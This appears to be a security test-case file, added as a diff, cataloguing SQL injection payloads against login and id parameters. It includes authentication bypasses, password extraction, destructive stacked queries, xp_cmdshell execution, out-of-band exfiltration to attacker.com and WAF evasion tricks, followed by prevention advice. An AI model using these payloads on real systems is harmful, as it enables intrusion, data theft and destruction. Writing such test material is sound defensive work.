@@ -1,0 +1,156 @@
+# A05:2025 - Injection - SQL Injection Test Cases
+# CWE-89: Improper Neutralization of Special Elements used in an SQL Command
+
+test_category: "A05-injection"
+subcategory: "sql-injection"
+owasp_2025: "A05"
+cwe: "CWE-89"
+severity: "CRITICAL"
+
+test_cases:
+  - id: "SQLI-001"
+    name: "Authentication Bypass - Basic"
+    description: "Bypass login using SQL injection"
+    method: "POST"
+    endpoint: "/login"
+    payloads:
+      - "username: admin' OR '1'='1"
+      - "username: admin' OR '1'='1'--"
+      - "username: admin' OR '1'='1'#"
+      - "username: ' OR 1=1--"
+      - "username: admin'--"
+      - "password: ' OR '1'='1"
+    expected_result: "Invalid credentials error"
+    vulnerable_result: "Successful login as admin"
+    
+  - id: "SQLI-002"
+    name: "UNION-based SQLi"
+    description: "Extract data using UNION SELECT"
+    payloads:
+      - "id=1' UNION SELECT NULL--"
+      - "id=1' UNION SELECT NULL,NULL--"
+      - "id=1' UNION SELECT NULL,NULL,NULL--"
+      - "id=1' UNION SELECT username,password FROM users--"
+      - "id=1' UNION SELECT table_name,NULL FROM information_schema.tables--"
+      - "id=1' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--"
+    detection: "Different number of columns errors, then successful data extraction"
+    
+  - id: "SQLI-003"
+    name: "Boolean-based Blind SQLi"
+    description: "Infer data through true/false responses"
+    payloads:
+      - "id=1' AND 1=1--" # True
+      - "id=1' AND 1=2--" # False
+      - "id=1' AND (SELECT COUNT(*) FROM users)>0--"
+      - "id=1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--"
+      - "id=1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--"
+    detection: "Different responses for true vs false conditions"
+    
+  - id: "SQLI-004"
+    name: "Time-based Blind SQLi"
+    description: "Use time delays to infer data"
+    database_specific:
+      mysql:
+        - "id=1' AND SLEEP(5)--"
+        - "id=1' AND IF(1=1,SLEEP(5),0)--"
+        - "id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+      postgresql:
+        - "id=1'; SELECT pg_sleep(5)--"
+        - "id=1' AND (SELECT pg_sleep(5))::text IS NOT NULL--"
+      mssql:
+        - "id=1'; WAITFOR DELAY '00:00:05'--"
+        - "id=1' AND (SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT CAST(CHAR(65) AS VARCHAR(5000))) END) IS NOT NULL; WAITFOR DELAY '00:00:05'--"
+      oracle:
+        - "id=1' AND dbms_pipe.receive_message('a',5) IS NULL--"
+    detection: "Response delayed by specified seconds"
+    
+  - id: "SQLI-005"
+    name: "Error-based SQLi"
+    description: "Extract data through error messages"
+    payloads:
+      - "id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--"
+      - "id=1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--"
+      - "id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--"
+    detection: "Database error messages containing sensitive data"
+    
+  - id: "SQLI-006"
+    name: "Stacked Queries"
+    description: "Execute multiple statements"
+    payloads:
+      - "id=1; DROP TABLE users--"
+      - "id=1; INSERT INTO users VALUES('hacker','password')--"
+      - "id=1; UPDATE users SET password='hacked' WHERE username='admin'--"
+      - "id=1; EXEC xp_cmdshell('whoami')--" # MSSQL
+    risk: "Data modification, privilege escalation"
+    severity: "CRITICAL"
+    
+  - id: "SQLI-007"
+    name: "Out-of-Band SQLi"
+    description: "Exfiltrate data through external channel"
+    payloads:
+      mysql:
+        - "id=1' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.attacker.com\\\\a'))--"
+      mssql:
+        - "id=1'; DECLARE @q VARCHAR(8000); SET @q='\\\\'+@@version+'.attacker.com\\a'; EXEC master..xp_dirtree @q--"
+      oracle:
+        - "id=1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||user) FROM dual--"
+    detection: "DNS/HTTP requests to attacker-controlled server"
+    
+  - id: "SQLI-008"
+    name: "Second Order SQLi"
+    description: "Injection stored and executed later"
+    test_steps:
+      - "Register user with username: admin'--"
+      - "Login with that username"
+      - "Perform profile update that uses stored username in SQL"
+    vulnerable_result: "Stored payload executes during profile update"
+
+injection_points:
+  - "Login forms (username, password)"
+  - "Search fields"
+  - "Sort/Filter parameters"
+  - "Pagination (offset, limit)"
+  - "User profile fields"
+  - "Cookie values"
+  - "HTTP headers (User-Agent, Referer)"
+  - "JSON/XML parameters"
+
+waf_bypass_techniques:
+  encoding:
+    - "URL encoding: %27 for '"
+    - "Double encoding: %2527"
+    - "Unicode: %u0027"
+    - "Hex encoding: 0x27"
+  
+  case_variation:
+    - "SeLeCt, uNiOn, oR"
+  
+  comments:
+    - "/**/SELECT/**/"
+    - "/*!50000SELECT*/"
+    - "/*!12345UNION*/"
+  
+  whitespace:
+    - "SELECT/*comment*/FROM"
+    - "SELECT%0AFROM" # newline
+    - "SELECT%09FROM" # tab
+  
+  concatenation:
+    - "'ad'+'min'"
+    - "'ad'||'min'"
+    - "CONCAT('ad','min')"
+
+prevention:
+  - "Use parameterized queries (prepared statements)"
+  - "Use stored procedures with parameterized inputs"
+  - "Input validation with whitelist"
+  - "Escape special characters"
+  - "Principle of least privilege for database accounts"
+  - "Use ORM frameworks properly"
+  - "Disable error messages in production"
+
+references:
+  - "OWASP Top 10:2025 A05"
+  - "CWE-89: SQL Injection"
+  - "OWASP SQL Injection Prevention Cheat Sheet"
+  - "PayloadsAllTheThings: SQL Injection"
